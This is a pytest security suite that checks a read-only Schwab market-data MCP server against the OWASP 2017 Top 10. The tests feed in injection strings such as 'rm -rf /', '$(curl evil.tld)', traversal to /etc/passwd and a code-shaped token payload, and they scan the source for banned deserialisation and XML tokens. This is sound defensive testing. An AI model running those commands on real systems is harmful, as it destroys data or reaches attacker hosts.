"""OWASP Top 10 — 2017 edition security suite (batch 2).

Each test maps to a 2017 category via an ``# OWASP 2017 Axx`` comment.
schwab-marketdata-mcp attack surface notes:

* The OAuth token carries the **marketData** scope, which is read-only by
  Schwab API design — there is no trade capability to abuse (distinct from
  schwab-positions-mcp, which enforces read-only in code).  We therefore
  assert the *data-plane* posture: no mutation endpoints exist and no tool
  can be coerced into writing through the Schwab API.
* SSRF: ``symbol`` / instrument identifiers must never let an attacker
  control an arbitrary outbound URL — the symbol regexes + schwab-py's
  fixed base URL contain this.
* Injection: symbols reach DuckDB only through **parameterised** queries.
* Deserialisation: token.json + every fixture are parsed with strict JSON.
* N/A: A4 XXE — there is no XML parser anywhere in the package (asserted by
  a source-scan guard); A7 XSS — the server emits JSON-RPC only, never HTML.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from schwab_marketdata_mcp import cache
from schwab_marketdata_mcp.cache_backend import MemoryBackend
from schwab_marketdata_mcp.errors import SchwabAuthError, redact_secrets
from schwab_marketdata_mcp.models import GetQuoteInput
from schwab_marketdata_mcp.security import (
    TokenState,
    check_token_file_state,
    resolve_token_path,
)

SRC_ROOT = Path(__file__).resolve().parents[1] / "src" / "schwab_marketdata_mcp"


# ---------------------------------------------------------------------------
# OWASP 2017 A1 — Injection
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "evil",
    [
        "AAPL'; DROP TABLE quotes_cache;--",
        "AAPL OR 1=1",
        "AAPL/**/UNION/**/SELECT",
        "AAPL`; rm -rf /",
        "$(curl evil.tld)",
        "AAPL\x00",
    ],
)
def test_a1_symbol_injection_rejected_by_regex(evil: str) -> None:
    """OWASP 2017 A1 — Pydantic symbol regex rejects SQL/command metacharacters."""
    with pytest.raises(Exception):
        GetQuoteInput(symbol=evil)


def test_a1_cache_keys_store_payload_as_inert_data() -> None:
    """OWASP 2017 A1 — a symbol containing SQL metachars cannot escape the
    backend's parameter binding: it round-trips verbatim, never executed.

    v0.3.0+: the response cache binds (table, key) via ClickHouse query
    parameters / opaque memory keys; there is no SQL string interpolation."""
    weird = "A';DROP"
    with cache.Cache(backend=MemoryBackend()) as c:
        c.put_quote(weird, {weird: {"quote": {"lastPrice": 1.23}}})
        got = c.get_quote(weird)
        stats = c.get_stats()
    assert got is not None
    assert got[weird]["quote"]["lastPrice"] == 1.23
    assert stats.entries == 1


def test_a1_source_has_no_string_built_sql_with_user_input() -> None:
    """OWASP 2017 A1 — guard: no f-string SQL interpolates user symbols.

    The only f-string table names in cache.py come from the *internal*
    ``_TABLE_NAMES`` allow-list (flagged ``# noqa: S608``); none splice a
    caller-supplied symbol/param.  We assert every dynamic-SQL site is
    constrained to that allow-list.
    """
    src = (SRC_ROOT / "cache.py").read_text(encoding="utf-8")
    # Every f-string DELETE/SELECT/COUNT must interpolate only ``{tbl}`` /
    # ``{table}`` (validated against _TABLE_NAMES), never ``{symbol}`` etc.
    for line in src.splitlines():
        stripped = line.strip()
        if stripped.startswith(('f"""', 'f"')) and ("SELECT" in line or "DELETE" in line):
            assert "{symbol}" not in line and "{params}" not in line and "{key}" not in line


# ---------------------------------------------------------------------------
# OWASP 2017 A2 — Broken Authentication
# ---------------------------------------------------------------------------


def test_a2_missing_token_is_not_silently_accepted(tmp_path: Path) -> None:
    """OWASP 2017 A2 — an absent token yields MISSING, never a usable session."""
    state, parsed = check_token_file_state(tmp_path / "absent.json")
    assert state is TokenState.MISSING
    assert parsed is None


def test_a2_token_path_outside_allow_list_rejected(_isolate_xdg_state: Path) -> None:
    """OWASP 2017 A2 — credential storage path is allow-listed (no /etc, /root)."""
    with pytest.raises(SchwabAuthError) as ei:
        resolve_token_path("/etc/shadow")
    assert ei.value.reason == "path_not_in_allow_list"


# ---------------------------------------------------------------------------
# OWASP 2017 A3 — Sensitive Data Exposure
# ---------------------------------------------------------------------------


def test_a3_app_secret_and_tokens_redacted() -> None:
    """OWASP 2017 A3 — bearer/access/refresh secrets are scrubbed from strings."""
    raw = 'Authorization: Bearer eyJ.header.sig {"access_token":"AT-123","refresh_token":"RT-456","app_secret":"SEC-789"}'  # pragma: allowlist secret
    out = redact_secrets(raw)
    assert "eyJ.header.sig" not in out
    assert "AT-123" not in out
    assert "RT-456" not in out


def test_a3_token_file_state_never_returns_secret_material(tmp_path: Path) -> None:
    """OWASP 2017 A3 — VALID parse returns metadata only; downstream callers
    (health/meta) never surface the raw token bytes."""
    import os

    f = tmp_path / "token.json"
    f.write_text(json.dumps({"creation_timestamp": 1700000000, "access_token": "SECRET"}))
    os.chmod(f, 0o600)
    state, parsed = check_token_file_state(f)
    assert state is TokenState.VALID
    # The parsed dict is internal; the public health/meta layers must not echo
    # access_token.  Assert the value is never emitted by the redactor either.
    assert "SECRET" not in redact_secrets(json.dumps(parsed))


# ---------------------------------------------------------------------------
# OWASP 2017 A4 — XML External Entities (XXE)  [N/A — no XML parser]
# ---------------------------------------------------------------------------


def test_a4_xxe_not_applicable_no_xml_parsers_in_source() -> None:
    """OWASP 2017 A4 — N/A: the package parses zero XML.

    Source-scan guard: no ``xml.``/``lxml``/``etree``/``xmlrpc`` import and no
    ``XMLParser`` usage anywhere under src/.  If a future change introduces an
    XML parser this guard fails so XXE coverage can be (re)added.
    """
    banned = ("import xml", "from xml", "lxml", "etree", "xmlrpc", "XMLParser", "minidom")
    for py in SRC_ROOT.rglob("*.py"):
        text = py.read_text(encoding="utf-8")
        for token in banned:
            assert token not in text, f"{py.name} introduced XML handling ({token!r}); add XXE tests"


# ---------------------------------------------------------------------------
# OWASP 2017 A5 — Broken Access Control
# ---------------------------------------------------------------------------


def test_a5_dotdot_traversal_in_token_path_rejected(_isolate_xdg_state: Path) -> None:
    """OWASP 2017 A5 — path traversal via ``..`` is rejected by the allow-list."""
    with pytest.raises(SchwabAuthError):
        resolve_token_path("~/.local/state/../../../../etc/passwd")


# ---------------------------------------------------------------------------
# OWASP 2017 A6 — Security Misconfiguration
# ---------------------------------------------------------------------------


def test_a6_gitignore_blocks_secret_artifacts() -> None:
    """OWASP 2017 A6 — secrets/state files are git-ignored."""
    gi = (SRC_ROOT.parents[1] / ".gitignore").read_text(encoding="utf-8")
    for must in (".env", "token.json", "usage.jsonl"):
        assert must in gi, f".gitignore missing {must!r}"


# ---------------------------------------------------------------------------
# OWASP 2017 A7 — Cross-Site Scripting (XSS)  [N/A — JSON-RPC, no HTML]
# ---------------------------------------------------------------------------


def test_a7_xss_not_applicable_no_html_rendering() -> None:
    """OWASP 2017 A7 — N/A: the server speaks JSON-RPC over stdio and never
    renders HTML.  Source-scan guard: no HTML content-type, template engine,
    or ``text/html`` emission anywhere under src/."""
    banned = ("text/html", "render_template", "jinja2", "<html", "<script", "Markup(")
    for py in SRC_ROOT.rglob("*.py"):
        text = py.read_text(encoding="utf-8")
        for token in banned:
            assert token not in text, f"{py.name} introduced HTML output ({token!r}); add XSS tests"


# ---------------------------------------------------------------------------
# OWASP 2017 A8 — Insecure Deserialisation
# ---------------------------------------------------------------------------


def test_a8_no_pickle_or_eval_deserialisation_in_source() -> None:
    """OWASP 2017 A8 — guard: no pickle/marshal/eval/exec used to decode data."""
    banned = ("import pickle", "pickle.loads", "marshal.loads", "eval(", "exec(", "yaml.load(")
    for py in SRC_ROOT.rglob("*.py"):
        text = py.read_text(encoding="utf-8")
        for token in banned:
            assert token not in text, f"{py.name} uses unsafe deserialisation ({token!r})"


def test_a8_malicious_token_payload_yields_malformed_not_exec(tmp_path: Path) -> None:
    """OWASP 2017 A8 — a code-shaped token body is treated as MALFORMED JSON,
    never executed."""
    import os

    f = tmp_path / "token.json"
    f.write_text("__import__('os').system('touch /tmp/pwned')")
    os.chmod(f, 0o600)
    state, _ = check_token_file_state(f)
    assert state is TokenState.MALFORMED
    assert not Path("/tmp/pwned").exists()


def test_a8_cache_get_rejects_non_dict_payload() -> None:
    """OWASP 2017 A8 — the cache only deserialises dict payloads; a non-dict
    JSON value stored in the backend is rejected (returns None / miss)."""
    from unittest.mock import MagicMock

    from schwab_marketdata_mcp.cache_backend import ClickHouseBackend

    client = MagicMock()
    client.command.return_value = None
    result = MagicMock()
    result.result_rows = [["[1, 2, 3]"]]  # valid JSON but a list, not a dict
    client.query.return_value = result
    backend = ClickHouseBackend(url="clickhouse://x", client=client)
    # The backend's response-cache get rejects non-dict payloads.
    assert backend.get("quotes_cache", "AAPL") is None


# ---------------------------------------------------------------------------
# OWASP 2017 A9 — Using Components with Known Vulnerabilities
# ---------------------------------------------------------------------------


def test_a9_no_snapshot_or_wildcard_pins_in_pyproject() -> None:
    """OWASP 2017 A9 — dependencies are version-bounded (no SNAPSHOT, no bare ``*``)."""
    pyproject = (SRC_ROOT.parents[1] / "pyproject.toml").read_text(encoding="utf-8")
    assert "SNAPSHOT" not in pyproject
    # A bare ``= "*"`` wildcard pin would defeat CVE tracking.
    assert '= "*"' not in pyproject


# ---------------------------------------------------------------------------
# OWASP 2017 A10 — Insufficient Logging & Monitoring
# ---------------------------------------------------------------------------


def test_a10_usage_metrics_record_no_pii(tmp_path: Path) -> None:
    """OWASP 2017 A10 — usage.jsonl records metadata only (no params/secrets)."""
    from schwab_marketdata_mcp import metrics

    p = tmp_path / "usage.jsonl"
    metrics.record(tool="get_quote", status="ok", error_class=None, latency_ms=12, path=p)
    line = p.read_text(encoding="utf-8").strip()
    obj = json.loads(line)
    assert set(obj) <= {"ts", "tool", "status", "error_class", "latency_ms", "cache_status"}
    # No symbol / token / params field is permitted in the record.
    assert "symbol" not in obj
    assert "access_token" not in obj
